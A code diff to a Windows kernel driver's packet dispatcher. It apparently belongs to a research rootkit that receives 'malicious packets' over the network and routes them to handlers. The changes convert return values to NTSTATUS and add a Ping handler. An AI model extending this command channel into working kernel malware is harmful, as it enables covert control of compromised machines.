@@ -5,6 +5,7 @@
  * COPYRIGHT Bill Demirkapi 2020
  */
 #include "PacketDispatch.h"
+#include "PingPacketHandler.h"
 
 /**
 	Populate the necessary members in the PacketDispatch class.
@@ -157,7 +158,7 @@ Exit:
 */
 BOOLEAN
 PacketDispatch::SendBuffer (
-	_In_ CHAR* Buffer,
+	_In_ PVOID Buffer,
 	_In_ SIZE_T BufferSize
 	)
 {
@@ -278,7 +279,7 @@ Exit:
 */
 BOOLEAN
 PacketDispatch::ReceiveBuffer (
-	_In_ CHAR* Buffer,
+	_In_ PVOID Buffer,
 	_In_ SIZE_T BufferSize,
 	_Inout_ ULONG* BytesReceived
 	)
@@ -395,7 +396,7 @@ Exit:
 	@param RemainingBytes - The number of bytes remaining after the base packet.
 	@return Whether or not parsing was successful. Fails if cannot receive more bytes.
 */
-BOOLEAN
+NTSTATUS
 PacketDispatch::PopulateBasePacket (
 	_Inout_ PBASE_PACKET PartialBasePacket,
 	_Inout_ ULONG* RemainingBytes
@@ -439,7 +440,7 @@ PacketDispatch::PopulateBasePacket (
 								   &bytesReceived) == FALSE)
 			{
 				DBGPRINT("PacketDispatch!PopulateBasePacket: Failed to receive rest of base packet.");
-				return FALSE;
+				return STATUS_NO_MEMORY;
 			}
 			bytesAfterMagic += bytesReceived;
 			receiveRetryCount++;
@@ -453,7 +454,7 @@ PacketDispatch::PopulateBasePacket (
 		{
 			NT_ASSERT(FALSE);
 			DBGPRINT("PacketDispatch!PopulateBasePacket: Failed to receive base packet.");
-			return FALSE;
+			return STATUS_RETRY;
 		}
 
 		DBGPRINT("PacketDispatch!PopulateBasePacket: Received the rest of the base packet.");
@@ -466,7 +467,7 @@ PacketDispatch::PopulateBasePacket (
 		*RemainingBytes = bytesAfterMagic - sizeof(BASE_PACKET);
 	}
 
-	return TRUE;
+	return STATUS_SUCCESS;
 }
 
 /**
@@ -476,7 +477,7 @@ PacketDispatch::PopulateBasePacket (
 	@param RemainingBytes - The number of bytes remaining after the BASE_PACKET.
 	@return Whether or not we were able to successfully populate the rest of a malicious packet.
 */
-BOOLEAN
+NTSTATUS
 PacketDispatch::PopulateMaliciousPacket (
 	_In_ PBASE_PACKET PartialBasePacket,
 	_Inout_ PBASE_PACKET FullBasePacket,
@@ -543,7 +544,7 @@ PacketDispatch::PopulateMaliciousPacket (
 									&bytesReceived) == FALSE)
 			{
 				DBGPRINT("PacketDispatch!ProcessMaliciousPacket: Failed to receive rest of full packet.");
-				return FALSE;
+				return STATUS_NO_MEMORY;
 			}
 
 			//
@@ -561,35 +562,35 @@ PacketDispatch::PopulateMaliciousPacket (
 		{
 			NT_ASSERT(FALSE);
 			DBGPRINT("PacketDispatch!ProcessMaliciousPacket: Failed to receive malicious packet.");
-			return FALSE;
+			return STATUS_RETRY;
 		}
 	}
 
-	return TRUE;
+	return STATUS_SUCCESS;
 }
 
 /**
 	Process the malicious packet.
 	@return Whether or not processing succeeded.
 */
-BOOLEAN
+NTSTATUS
 PacketDispatch::Process (
 	VOID
 	)
 {
-	BOOLEAN result;
+	NTSTATUS result;
 	BASE_PACKET partialBasePacket;
 	PBASE_PACKET fullBasePacket;
 	ULONG remainingBytes;
 
 	fullBasePacket = NULL;
-	result = TRUE;
+	result = STATUS_SUCCESS;
 
 	//
 	// Populate a partial base packet.
 	//
 	result = PopulateBasePacket(&partialBasePacket, &remainingBytes);
-	if (result == FALSE)
+	if (NT_SUCCESS(result) == FALSE)
 	{
 		DBGPRINT("PacketDispatch!Process: Failed to parse a partial base packet.");
 		goto Exit;
@@ -602,6 +603,7 @@ PacketDispatch::Process (
 	if (fullBasePacket == NULL)
 	{
 		DBGPRINT("PacketDispatch!Process: Failed to allocate space for the full malicious packet with size %i.", partialBasePacket.PacketLength);
+		result = STATUS_NO_MEMORY;
 		goto Exit;
 	}
 	memset(fullBasePacket, 0, partialBasePacket.PacketLength);
@@ -612,14 +614,15 @@ PacketDispatch::Process (
 	// Populate the full malicious packet.
 	//
 	result = PopulateMaliciousPacket(&partialBasePacket, fullBasePacket, remainingBytes);
-	if (result == FALSE)
+	if (NT_SUCCESS(result) == FALSE)
 	{
 		DBGPRINT("PacketDispatch!Process: Failed to parse a full base packet.");
 		goto Exit;
 	}
 
-	DBGPRINT("PacketDispatch!Process: Received full packet with type %i.", fullBasePacket->Type);
+	DBGPRINT("PacketDispatch!Process: Received full packet with type %i, dispatching.", fullBasePacket->Type);
 
+	result = this->Dispatch(fullBasePacket);
 Exit:
 	if (fullBasePacket)
 	{
@@ -633,16 +636,48 @@ Exit:
 	@param FullPacket - The packet to dispatch.
 	@return Whether or not there were issues with dispatching.
 */
-BOOLEAN
+NTSTATUS
 PacketDispatch::Dispatch (
 	_In_ PBASE_PACKET FullPacket
 	)
 {
+	NTSTATUS status;
+	PPACKET_HANDLER handler;
+	ULONG handlerTag;
+
+	PPING_PACKET_HANDLER pingHandler;
+
+	handler = NULL;
+	handlerTag = 0;
+	status = STATUS_NO_MEMORY;
+
 	//
-	// Main dispatch table.
+	// First, set the proper handler and its tag by the Type fron the FullPacket.
 	//
 	switch (FullPacket->Type)
 	{
-
+	case Ping:
+		pingHandler = new (NonPagedPool, PING_PACKET_HANDLER_TAG) PingPacketHandler(this);
+		handler = pingHandler;
+		handlerTag = PING_PACKET_HANDLER_TAG;
+		break;
+	default:
+		status = STATUS_NOT_SUPPORTED;
+		break;
 	}
+
+	if (handler)
+	{
+		//
+		// Process the packet.
+		//
+		status = handler->ProcessPacket(FullPacket);
+
+		//
+		// Make sure to free the handler.
+		//
+		ExFreePoolWithTag(handler, handlerTag);
+	}
+
+	return status;
 }
